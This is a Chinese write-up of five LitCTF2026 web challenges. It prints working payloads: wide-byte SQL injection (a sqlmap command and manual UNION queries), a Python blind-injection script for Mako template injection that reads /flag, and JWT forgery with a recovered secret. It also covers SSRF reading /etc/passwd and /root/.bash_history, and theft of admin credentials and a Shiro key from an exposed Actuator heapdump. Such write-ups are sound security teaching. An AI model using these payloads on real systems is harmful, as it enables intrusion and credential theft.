---
title: LitCTF2026 web方向wp
date: 2026-05-24 10:13:21
tags:
---

被强制培训一天，中午休息时间和eternal半小时闪击了LitCTF

![image-20260524101457511](https://gitee.com/bobrocket/img/raw/master/image-20260524101457511.png)

## lit_ezsql

一个SQL注入，正常查询的话id=1或id=2能查询出数据，下面我们测试一下闭合

```text
1 and 1=2 #
1'
1"
1')
1")
```

常见的几种组合都没有报错，并且能正常返回查询的数据，下面测试一些特殊的组合

```text
2abc
2e0
2-1
```

这些都返回了id=2的数据，说明对传进去的参数进行了处理，下面我们尝试一下宽字节注入

用sqlmap指定宽字节注入就能注出来

```text
sqlmap -u "http://challenge.cyclens.tech:31302/query?id=1" -D ezsql -T flag_store -C flag --dump --tamper=unmagicquotes --delay=0.5
```

![image-20260523201920975](https://gitee.com/bobrocket/img/raw/master/image-20260523201920975.png)

下面介绍一下手注的流程

测试 payload：

```bash
http://challenge.cyclens.tech:32035/query?id=1%bf%27%20OR%201=1--+
```

其中：

- `%bf` 是宽字节前导
- `%27` 是单引号 `'`
- 后面拼接 `OR 1=1--+`

返回结果中同时出现了两条记录，这就说明注入成功了，下面就是union拼接依次查库查表查字段查flag了

```text
/query?id=-1%bf%27%20UNION%20SELECT%201,database(),3,4,5--+
/query?id=-1%bf%27%20UNION%20SELECT%201,group_concat(table_name),3,4,5%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--+
/query?id=-1%bf%27%20UNION%20SELECT%201,2,3,4,group_concat(flag)%20FROM%20flag_store--+
```

## lit_ezssti

### 初步分析

不是常见的jinja引擎，我们进行常规测试

```
${7*7} WAF
{{7*7}} 不渲染
<%= 7*7 %> WAF
```

两个关键探测都显示WAF，不是jinja和twig，尝试故意制造报错进一步探测

`%`返回了报错

![image-20260524132651533](https://gitee.com/bobrocket/img/raw/master/image-20260524132651533.png)

基本可以判断是mako，它支持% if ...:、% for ...: 这种控制行语法

```
% if 1:
OK
% endif
```

返回了OK，确定是mako，下面进行一下单字符fuzz

```python
from time import sleep
import requests
import urllib
url = "http://challenge.cyclens.tech:30191/"
for i in range(32, 127):
    html = chr(i)
    # print(html)
    data = {'tpl': html}
    # 会自动url编码，不需要手动编码
    r = requests.post(url=url , data=data)
    if "WAF" in r.text:
        print(html)
```

单字符`.=[]`，`${...} <%= ... %>`被过滤了

尝试一下open("/flag"),flag关键词被过滤了，我们拼接绕过

![image-20260524134743035](https://gitee.com/bobrocket/img/raw/master/image-20260524134743035.png)

现在确定flag在哪里并且可以打开了，不能直接读，由于单字符的过滤所以外带也不太行，只能盲注了

下面思考点字符被过滤了应该怎么从文件里面截取字符

### 知识补充

#### 用getattr访问属性

![image-20260524143304527](https://gitee.com/bobrocket/img/raw/master/image-20260524143304527.png)

`getattr(open("/"+"f"+"l"+"a"+"g"), 'read')()`就成了`open('/flag').read()`的完美平替

#### 用_getitem__截取字符

![image-20260524143807424](https://gitee.com/bobrocket/img/raw/master/image-20260524143807424.png)

![image-20260524143818897](https://gitee.com/bobrocket/img/raw/master/image-20260524143818897.png)

### 构造盲注

```
% if getattr(getattr(open("/"+"f"+"l"+"a"+"g"), 'read')(), '__getitem__')(0) in 'f':
True_Flag
% endif
```

经测试可行，下面写脚本

```python
from time import sleep
import requests
import urllib

url = "http://challenge.cyclens.tech:30191/"
str_range = '}{-abcdefghijklmnopqrstuvwxyz0123456789'

def getData(str_list):
    j = 0
    while True:
        for i in str_list:
            data={'tpl':f"""% if getattr(getattr(open("/"+"f"+"l"+"a"+"g"), 'read')(), '__getitem__')({j}) in '{i}':\nTrue_Flag\n% endif"""}
            r = requests.post(url=url , data=data)
            if """<pre id="out">True_Flag""" in r.text:
                print(i, end="")
                if i == "}":
                    print()
                    return 1
                break
        j = j + 1

if __name__ == '__main__':
    getData(str_range)
```

![image-20260524143939428](https://gitee.com/bobrocket/img/raw/master/image-20260524143939428.png)

## lit_reverse_my_web

![image-20260524150251872](https://gitee.com/bobrocket/img/raw/master/image-20260524150251872.png)

提示已经很清楚了，只有admin权限的用户才能访问/flag

先注册一个用户，获取jwt

![image-20260524151057561](https://gitee.com/bobrocket/img/raw/master/image-20260524151057561.png)

思路很明确了，去附件里面找secret_key

逆向这部分我不会，用ai找吧

```
secret_key=rMw_2026_litctf_jwt_secret_key!!
```

伪造admin

![image-20260524151710883](https://gitee.com/bobrocket/img/raw/master/image-20260524151710883.png)

![image-20260524151748773](https://gitee.com/bobrocket/img/raw/master/image-20260524151748773.png)



## Northbridge Document Hub

只能登录没有注册，题目说研究员账号已开放，去源码里寻找

![image-20260524154911802](https://gitee.com/bobrocket/img/raw/master/image-20260524154911802.png)

泄露了一个账号和一个路由，登录进去

![image-20260524155015847](https://gitee.com/bobrocket/img/raw/master/image-20260524155015847.png)

没什么发现，我们去看看那个路由

```
http://challenge.cyclens.tech:31440/kkfileview/getCorsFile?urlPath=ZmlsZTovLy9ldGMvcGFzc3dk  (file:///etc/passwd)
```

存在ssrf漏洞，但是flag在哪呢？题目提示试着从解析缓存里找到本季度财务归档中的 flag

读取 Bash History

```
http://challenge.cyclens.tech:31440/kkfileview/getCorsFile?urlPath=ZmlsZTovLy9yb290Ly5iYXNoX2hpc3Rvcnk=   (file:///root/.bash_history)
```

```
cd /opt/kkfileview/bin
./startup.sh --cache.dir=/opt/kkfileview/cache/parsed
java -jar kkFileView.jar --cache.dir=/opt/kkfileview/cache/parsed --forceUpdatedCache=true
cp /opt/kkfileview/cache/parsed/q1_finance_report_2026.zip /tmp/q1_finance_report_2026.zip
```

发现了缓存文件，下载就有flag

![image-20260524155559555](https://gitee.com/bobrocket/img/raw/master/image-20260524155559555.png)

## 华辰企业服务运营平台

不会java这里贴一个ai的wp

### 一、信息收集

访问首页可以确认这是一个基于 Java 的客服工单系统，公开页面比较干净，前端只暴露了少量接口：

- `/api/public/banner`
- `/api/public/news`
- `/api/auth/login`

继续对常见运维路径做探测后，发现 Spring Boot Actuator 被未授权开放：

- `/actuator`
- `/actuator/env`
- `/actuator/beans`
- `/actuator/mappings`
- `/actuator/heapdump`

这已经是非常危险的信息泄露面，基本可以直接转入服务端配置和内存分析。

### 二、接口枚举

通过 `/actuator/mappings` 可以直接拿到完整路由，除了前台接口外，还能看到隐藏管理接口：

- `/api/admin/system/summary`
- `/api/admin/system/export`
- `/api/admin/audit/list`
- `/api/admin/ops/reports`
- `/api/internal/feature-flags`
- `/api/ticket/list`
- `/api/workflow/list`

说明题目里提到的“运维与调试能力”确实还在，而且很多不是前端可见接口。

### 三、内存分析

#### 1. 直接读取环境变量 flag

先访问：

```text
/actuator/env/FLAG
```

返回：

```json
{"property":{"source":"systemEnvironment","value":"flag{ohqkysxu-o0rs-463-8ygw-hfronlxc3eoe7}"}}
```

这一步已经可以直接得到完整 flag。

不过题目要求“完成权限突破并还原完整 flag”，所以继续补完整利用链。

#### 2. 从 heapdump 提取账号与鉴权信息

下载：

```text
/actuator/heapdump
```

随后分析堆中的对象，可以定位到：

- `com.gzctf.lab.config.ShiroConfig`
- `com.gzctf.lab.config.LabRealm`
- `org.apache.shiro.web.mgt.CookieRememberMeManager`
- `com.gzctf.lab.service.LabFlagService`

在 `LabRealm` 中拿到系统内置用户：

- `admin` -> `A9r#Qv3!Lm7@Tp2$Xz5&Nk8*Hs4^Wc1`
- `user` -> `user123`

在 `CookieRememberMeManager` 中拿到 rememberMe 密钥字节：

```text
47 5a 43 54 46 53 68 69 72 6f 47 43 4d 4b 65 79
```

转成 ASCII 为：

```text
GZCTFShiroGCMKey
```

Base64 为：

```text
R1pDVEZTaGlyb0dDTUtleQ==
```

同时还能拿到 realm 名：

```text
com.gzctf.lab.config.LabRealm_0
```

### 四、权限突破

#### 路线 1：伪造 rememberMe

因为题目使用 Apache Shiro，可以利用泄露的 rememberMe 密钥伪造身份 cookie。伪造后访问：

```text
/api/auth/me
```

可以得到：

```json
{"authenticated":true,"user":"admin","roles":["user","ops","admin"]}
```

说明我们已经完成了基于 rememberMe 的身份伪造。

不过该系统的部分管理接口不仅要求“记住身份”，还要求完整登录态，所以继续走真实登录。

#### 路线 2：使用泄露的 admin 凭据登录

向 `/api/auth/login` 发送：

```json
{
  "username": "admin",
  "password": "A9r#Qv3!Lm7@Tp2$Xz5&Nk8*Hs4^Wc1",
  "rememberMe": true
}
```

返回：

```json
{"ok":true,"msg":"登录成功","user":"admin","roles":["user","ops","admin"]}
```

随后成功访问：

- `/api/admin/system/summary`
- `/api/admin/ops/reports`
- `/api/admin/audit/list`

其中 `/api/admin/audit/list` 返回：

```json
{
  "source":"audit-service",
  "items":[
    {"id":"AR-8301","detail":"登录异地告警已人工复核为误报"},
    {"id":"AR-8302","detail":"数据库结构变更任务延后执行"},
    {"id":"AR-8303","detail":"历史归档备注: 3-8ygw-hfronlxc3eoe7}"}
  ]
}
```

这里能看到 flag 的尾段也被埋在后台审计备注里，和服务器环境变量中的完整值相互印证。



## 参考文献

[深入浅出带你学习宽字节注入宽字节注入是SQL注入中常见的注入方式，利用数据库的编码转换错误来进行注入绕过，本文带大家了解 - 掘金](https://juejin.cn/post/7167647367246643208)

[Mako模板引擎以及沙箱机制-先知社区](https://xz.aliyun.com/news/11633)
